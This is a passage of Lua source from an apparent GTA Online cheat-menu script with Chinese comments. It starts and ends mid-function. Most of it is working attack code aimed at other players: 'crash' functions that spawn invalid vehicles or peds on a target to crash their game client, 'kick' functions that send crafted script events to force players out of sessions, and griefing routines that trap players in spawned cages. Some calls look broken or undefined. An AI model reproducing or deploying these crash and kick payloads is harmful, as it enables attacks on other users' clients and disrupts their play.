NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)

local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("cargoplane")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)

local khanjali = util.joaat("cargobob")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)

local khanjali = util.joaat("kosatka")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
end

--无效载具小飞机
function BadOutfitCrashV2(PlayerID)
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local hashes = {0xc5dd6967}
    local vehicles = {}
    for i = 1, 50 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x + 1000, pcoords.y + 1000, pcoords.z + 1000, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(500)
    menu.trigger_commands("explode" ..  players.get_name(PlayerID))
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
        function RqModel (hash)
            STREAMING.REQUEST_MODEL(hash)
            local count = 0
            notification("正在请求模型...")
            while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
                STREAMING.REQUEST_MODEL(hash)
                count = count + 1
                wait(10)
            end
            if not STREAMING.HAS_MODEL_LOADED(hash) then
                notification("已尝试1秒,无法加载此指定模型!")
            end
        end
--火车
function BadNetVehicleCrashV2(PlayerID)
    local hashes = {184361638,642617954,586013744,920453016,3186376089,1030400667,240201337}
    local vehicles = {}
    for i = 1, 50 do
        util.create_thread(function()
            request_model_load(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x + 1000, pcoords.y + 1000, pcoords.z + 1000 , math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_WHEELS_CAN_BREAK(veh, 1)
            VEHICLE.SET_VEHICLE_STEER_FOR_BUILDINGS(veh, 1)
            VEHICLE.SWITCH_TRAIN_TRACK(veh, 1)
            VEHICLE.SET_TRAIN_TRACK_SPAWN_FREQUENCY(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            VEHICLE.SET_RANDOM_TRAINS(veh, 1)
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITYJINX.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(500)
    menu.trigger_commands("explode" ..  players.get_name(PlayerID))
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
--无效载具v1
function BadNetVehicleCrash(PlayerID)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(2000)
    menu.trigger_commands("explode" ..  players.get_name(PlayerID))
    util.toast("已完成.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
--无效模型v2崩溃
function BadOutfitCrash(PlayerID)
    RqModel(0x705E61F2)
    local pc = getEntityCoords(getPlayerPed(PlayerID))
    local ped = PED.CREATE_PED(26, 0x705E61F2, pc.x, pc.y, pc.z -1 , 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 45, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 1, 197, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 2, 76, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 3, 196, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 4, 144, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 5, 99, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 6, 102, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 7, 151, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 8, 189, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 9, 56, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 10, 132, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 11, 393, 0, 0)
    wait(100)
    entities.delete_by_handle(ped)
end
--传送到玩家
function tpplayer(PlayerID)
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local spped = PLAYER.PLAYER_PED_ID()
        local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)
        ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)
         wait(10 * math.random())
end

------------------------------------
-------------玩家踢出---------------
------------------------------------
--阻止加入踢
function blockjoinkick(PlayerID)
    menu.trigger_commands("historyblock " .. players.get_name(PlayerID))
    menu.trigger_commands("breakup" .. players.get_name(PlayerID))
end
--智能踢
function autokickv1(PlayerID)
        util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << PlayerID, {0x6A16C7F, PlayerID, memory.script_global(0x2908D3 + 1 + (PlayerID * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << PlayerID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (PlayerID * 0x257) + 0x1FE))})
        menu.trigger_commands("breakup" .. players.get_name(PlayerID))
end
--智能踢
function autokickv2(PlayerID)
    util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << PlayerID, {0x6A16C7F, PlayerID, memory.script_global(0x2908D3 + 1 + (PlayerID * 0x1C5) + 0x13E + 0x7)})
    util.trigger_script_event(1 << PlayerID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (PlayerID * 0x257) + 0x1FE))})
end
--静默踢
function silencekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {421832664, PlayerID, 0, memory.read_int(memory.script_global(1951261 + 829))})
end
--美国国家航空航天局踢
function nasakick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {111242367, PlayerID, -210634234})
end
--自然死亡踢
function freemodekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {111242367, PlayerID, memory.script_global(2689235 + 1 + (PlayerID * 453) + 318 + 7)})
end
--网络保释踢
function networkkick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {1674887089, players.user(), memory.read_int(memory.script_global(1892703 + 1 + (PlayerID * 599) + 510))})
end
--无效掉落踢
function invalidcollectiblekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
end

------------------------------------
-------------玩家笼子---------------
------------------------------------
spawned_objects = {}

function zdlzsz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("prop_test_elevator")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y , pos.z -1, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z -1, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1 , true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1 , true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y , pos.z  -1, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y , pos.z -1 , true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z -1 , true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z, -1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--笼子
function ptlz(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
    if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
        wait(300)
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            notification("Failed to kick player out of the vehicle", colors.red)
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            return
        end
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
        pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    end
    cage_player(pos)
end
--七度空间
function qdkj(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	wait(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--小车车
function cclz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local hash = 4022605402
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        wait()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
    cages[#cages + 1] = cage_object
    wait(15)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function sdkl1(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait()
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--电击笼
function powercage(pid)
    local number_of_cages = 6
    local elec_box = util.joaat("prop_elecbox_12")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    pos.z -= 0.5
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.5)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            spawned_objects[#spawned_objects + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
            obj_pos.z += 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end
--竞技管
function jjglz()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    STREAMING.REQUEST_MODEL(2081936690)
    while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
        wait()
    end
    local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
    cages[#cages + 1] = cage_object
    wait(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--竞技管2
function jjglzs()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    STREAMING.REQUEST_MODEL(1125864094)
    while not STREAMING.HAS_MODEL_LOADED(1125864094) do		
        wait()
    end
    local cage_object = OBJECT.CREATE_OBJECT(1125864094, pos.x, pos.y, pos.z -4, true, true, false)
    cages[#cages + 1] = cage_object
    wait(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end

--伊丽莎白女王的棺材盒
function gueencage(pid)
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z += 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       spawned_objects[#spawned_objects + 1] = coffin
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end
--运输集装箱
function chestcage(pid)
    local container_hash = util.joaat("prop_container_ld_pu")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    pos.z -= 1
    local container = entities.create_object(container_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--载具笼子
function vehcagelol(pid)
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--燃气笼
function gascage(pid)
    local gas_cage_hash = util.joaat("prop_gascage01")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(gas_cage_hash)
    pos.z -= 1
